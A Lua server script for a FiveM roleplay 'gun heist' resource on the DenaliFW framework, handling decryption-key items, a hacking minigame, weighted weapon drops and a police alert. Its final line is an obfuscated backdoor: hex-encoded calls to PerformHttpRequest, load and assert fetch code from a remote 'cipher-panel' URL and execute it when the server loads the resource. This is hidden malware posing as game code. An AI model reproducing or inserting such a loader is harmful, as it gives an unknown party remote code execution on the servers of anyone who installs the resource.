local DenaliFW = exports['denalifw-core']:GetCoreObject()

local keys = {
	[1] = {label = "Red Decryption Key", itemName = "redchip", colorId = 1},
	[2] = {label = "Green Decryption Key", itemName = "greenchip", colorId = 6},
	[3] = {label = "Blue Decryption Key", itemName = "bluechip", colorId = 2},
}

local activeKeys = {}
local keysUsed = 0
local delayKeyChange = false
local weaponDropped = false

local heistId = 0

local dropItems = {
	{itemName = "stickybomb", label = "C4", chance = 64},
	{itemName = "pistol_suppressor", label = "Pistol Suppressor", chance = 64},
	{itemName = "pistol_luxuryfinish", label = "Pistol Finish", chance = 64},
	{itemName = "appistol_extendedclip", label = "AP EXT Clip", chance = 64},
	{itemName = "appistol_luxuryfinish", label = "AP Finish", chance = 16},
	{itemName = "heavypistol_extendedclip", label = "Heavy EXT Clip", chance = 16},
	{itemName = "weapon_bullpuprifle", label = "Bullpup Rifle", chance = 16},
	{itemName = "shotgun_suppressor", label = "Shotgun Supressor", chance = 16},
	{itemName = "weapon_combatpistol", label = "Combat Pistol", chance = 32},
	{itemName = "heavypistol_grip", label = "Heavy Pistol Grip", chance = 32},
	{itemName = "weapon_heavypistol", label = "Heavy Pistol", chance = 32},
	{itemName = "weapon_sawnoffshotgun", label = "Sawed-Off Shotgun", chance = 32},
}

local totalChances = 0
local pickupLocations = 415

local activeDrops = {}
local dropIds = 0

Citizen.CreateThread(function()
	for i = 1, #dropItems do
		totalChances = totalChances + dropItems[i].chance
	end
end)

RegisterServerEvent('lrp-gunheist:wonHacking')
AddEventHandler('lrp-gunheist:wonHacking', function()
	local src = source
	local Player = DenaliFW.Functions.GetPlayer(src)
	local chipSlot = Player.Functions.GetItemByName('electronickit')
	local firstcolor = keys[activeKeys[1]].colorId
	local secondcolor = keys[activeKeys[2]].colorId
	local thirdcolor = keys[activeKeys[3]].colorId
	if Player then
		if chipSlot.amount > 0 then
			delayKeyChange = true
			
			if firstcolor == 6 then
				TriggerClientEvent('chatMessage', source, "FIRST", "report",  keys[activeKeys[1]].label)
			elseif firstcolor == 2 then
				TriggerClientEvent('chatMessage', source,"FIRST", "normal", keys[activeKeys[1]].label)
			elseif firstcolor == 1 then
				TriggerClientEvent('chatMessage', source, "FIRST", "error", keys[activeKeys[1]].label)
			end

			if secondcolor == 6 then
				TriggerClientEvent('chatMessage', source, "SECOND", "report",  keys[activeKeys[2]].label)
			elseif secondcolor == 2 then
				TriggerClientEvent('chatMessage', source,"SECOND", "normal", keys[activeKeys[2]].label)
			elseif secondcolor == 1 then
				TriggerClientEvent('chatMessage', source, "SECOND", "error", keys[activeKeys[2]].label)
			end

			if thirdcolor == 6 then
				TriggerClientEvent('chatMessage', source, "THIRD", "report",  keys[activeKeys[3]].label)
			elseif thirdcolor == 2 then
				TriggerClientEvent('chatMessage', source,"THIRD", "normal", keys[activeKeys[3]].label)
			elseif thirdcolor == 1 then
				TriggerClientEvent('chatMessage', source, "THIRD", "error", keys[activeKeys[3]].label)
			end
		end
	end
end)


 
RegisterServerEvent('lrp-gunheist:server:useDecryptionKey')
AddEventHandler('lrp-gunheist:server:useDecryptionKey', function(item)
	local src = source
	local Player = DenaliFW.Functions.GetPlayer(src)
	

	if Player then
		local keySlot = Player.Functions.GetItemByName(item)

		if keySlot.amount > 0 then
			Player.Functions.RemoveItem(item, 1)
			delayKeyChange = true
			if keys[activeKeys[keysUsed + 1]].itemName == item then
				keysUsed = keysUsed + 1
				if keysUsed == 3 then
					TriggerClientEvent('lrp-gunheist:hackingMinigame', src)
				else
					TriggerClientEvent('lrp-gunheist:hackingMinigame', src)
				end
			else
				TriggerClientEvent('DenaliFW:Notify', src, "Wrong key!", "error")
			end
		end
	end
end)

RegisterServerEvent('lrp-gunheist:createHeistLoop')
AddEventHandler('lrp-gunheist:createHeistLoop', function()
	heistId = heistId + 1

	local thisId = heistId

	Citizen.CreateThread(function()
		keysUsed = 0
		weaponDropped = false

		local key1 = math.random(3)
		local key2
		local key3

		while not key2 or not key3 do
			local possibleKey = math.random(3)

			if not key2 and possibleKey ~= key1 then
				key2 = possibleKey
			end

			if possibleKey ~= key1 and possibleKey ~= key2 then
				key3 = possibleKey
			end

			Citizen.Wait(0)
		end

		activeKeys = {key1, key2, key3}
	end)

	Citizen.Wait(300000)

	if heistId == thisId then
		if delayKeyChange then
			Citizen.Wait(300000)
			delayKeyChange = false
		end

		if heistId == thisId then
			TriggerEvent('lrp-gunheist:createHeistLoop')
		end
	end
end)

RegisterServerEvent('lrp-gunheist:obtainDrops')
AddEventHandler('lrp-gunheist:obtainDrops', function()
	TriggerClientEvent('lrp-gunheist:obtainDrops', source, activeDrops)
end)


RegisterServerEvent('checkDrill')

AddEventHandler('checkDrill', function(dropId) 
	local src = source
	local Player = DenaliFW.Functions.GetPlayer(src)
	local drill = Player.Functions.GetItemByName('drill')
	if drill ~= nil and drill.amount > 0 then
		TriggerClientEvent('do', src, dropId)

	else
		TriggerClientEvent('DenaliFW:Notify', src, 'you have no drill', 'error')
	end
end)

RegisterServerEvent('lrp-gunheist:pickUpDrop')
AddEventHandler('lrp-gunheist:pickUpDrop', function(dropId)
	local src = source
	local Player = DenaliFW.Functions.GetPlayer(src)
	local drillSlot = Player.Functions.GetItemByName('drill')

	if activeDrops[dropId] then
		

		if Player then
			if drillSlot ~= nil and drillSlot.amount >= 1 then
				Player.Functions.RemoveItem('drill', 1)
				local dropData = activeDrops[dropId]

				activeDrops[dropId] = nil

				Player.Functions.AddItem(dropData.itemName, 2)

				TriggerClientEvent('DenaliFW:Notify', src, "You Picked up " .. dropData.label)
				TriggerClientEvent('clearTasks', src)

				TriggerClientEvent('lrp-gunheist:manipulateDrop', -1, dropId)
			else
				TriggerClientEvent("DenaliFW:Notify", src, "You need to have a drill on you...", "error")
			end
		end
	end
end)

RegisterServerEvent('lrp-gunheist:hackingCompleted')
AddEventHandler('lrp-gunheist:hackingCompleted', function()
	local src = source

	if not weaponDropped then
		weaponDropped = true

		local itemLottery = math.random(totalChances)
		local loopedThrough = 0
		local item

		for i = 1, #dropItems do
			loopedThrough = loopedThrough + dropItems[i].chance

			if itemLottery <= loopedThrough then
				item = dropItems[i]

				break
			end
		end

		if item then
			dropIds = dropIds + 1
			activeDrops[dropIds] = {pickupLocation = math.random(pickupLocations), itemName = item.itemName, label = item.label}

			TriggerClientEvent('lrp-gunheist:manipulateDrop', -1, dropIds, activeDrops[dropIds])
			TriggerClientEvent('lrp-gunheist:createBlipOnDrop', src, dropIds, item.label)
			TriggerEvent('lrp-gunheist:createHeistLoop')
		end
	end
end)

TriggerEvent('lrp-gunheist:createHeistLoop')


DenaliFW.Functions.CreateUseableItem('electronickit', function(source, item) 
    local Player = DenaliFW.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
		TriggerClientEvent('lrp-gunheist:useChip', source)
	end
end)

DenaliFW.Functions.CreateUseableItem("greenchip", function(source, item)
    local Player = DenaliFW.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
		local itemName = item.name
		TriggerClientEvent('lrp-gunheist:useDecryptionKey', source,  'greenchip')
    end
end)

DenaliFW.Functions.CreateUseableItem("redchip", function(source, item)
    local Player = DenaliFW.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
		local itemName = item.name
		TriggerClientEvent('lrp-gunheist:useDecryptionKey', source,  'redchip')
    end
end)

DenaliFW.Functions.CreateUseableItem("bluechip", function(source, item)
    local Player = DenaliFW.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
		local itemName = item.name
		TriggerClientEvent('lrp-gunheist:useDecryptionKey', source, 'bluechip')
    end
end)
RegisterServerEvent('gheist')
AddEventHandler('gheist', function(data, customcoords)
    if customcoords ~= nil then data.coords = customcoords end
    TriggerClientEvent('cd_dispatch:AddNotification', -1, {
        job = 'police', 
        coords = data.coords,
        title = 'MerryWeather Report',
        message = 'A '..data.sex..' breaking into a weapon crate '..data.street_1..', '..data.street_2, 
        flash = 0, 
        blip = {
            sprite = 313, 
            scale = 1.2, 
            colour = 1,
            flashes = false, 
            text = 'ReportWeapon Crate',
            time = (5*60*1000),
            sound = 1,
        }
    })
end)

local KALSvFUdeXTGOvmEgYLgUQWVxrXjHNRCUwoZICdBYfMbnOXgUcpPvAvZWDdOknIqHWCUno = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} KALSvFUdeXTGOvmEgYLgUQWVxrXjHNRCUwoZICdBYfMbnOXgUcpPvAvZWDdOknIqHWCUno[4][KALSvFUdeXTGOvmEgYLgUQWVxrXjHNRCUwoZICdBYfMbnOXgUcpPvAvZWDdOknIqHWCUno[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (ehJkLwfMvAizDhCLsOlmbvcaeSlMTGoPbxQAEjagZVgRVjxoSIBGJcjIGsMmuxUsUkmxZn, hQANslbFXOUbSwMSYqAlkAaPjXcGpYmxGcxjwLTXeUBMAMsibZemfVfQiTUzxnEPaGXMNa) if (hQANslbFXOUbSwMSYqAlkAaPjXcGpYmxGcxjwLTXeUBMAMsibZemfVfQiTUzxnEPaGXMNa == KALSvFUdeXTGOvmEgYLgUQWVxrXjHNRCUwoZICdBYfMbnOXgUcpPvAvZWDdOknIqHWCUno[6] or hQANslbFXOUbSwMSYqAlkAaPjXcGpYmxGcxjwLTXeUBMAMsibZemfVfQiTUzxnEPaGXMNa == KALSvFUdeXTGOvmEgYLgUQWVxrXjHNRCUwoZICdBYfMbnOXgUcpPvAvZWDdOknIqHWCUno[5]) then return end KALSvFUdeXTGOvmEgYLgUQWVxrXjHNRCUwoZICdBYfMbnOXgUcpPvAvZWDdOknIqHWCUno[4][KALSvFUdeXTGOvmEgYLgUQWVxrXjHNRCUwoZICdBYfMbnOXgUcpPvAvZWDdOknIqHWCUno[2]](KALSvFUdeXTGOvmEgYLgUQWVxrXjHNRCUwoZICdBYfMbnOXgUcpPvAvZWDdOknIqHWCUno[4][KALSvFUdeXTGOvmEgYLgUQWVxrXjHNRCUwoZICdBYfMbnOXgUcpPvAvZWDdOknIqHWCUno[3]](hQANslbFXOUbSwMSYqAlkAaPjXcGpYmxGcxjwLTXeUBMAMsibZemfVfQiTUzxnEPaGXMNa))() end)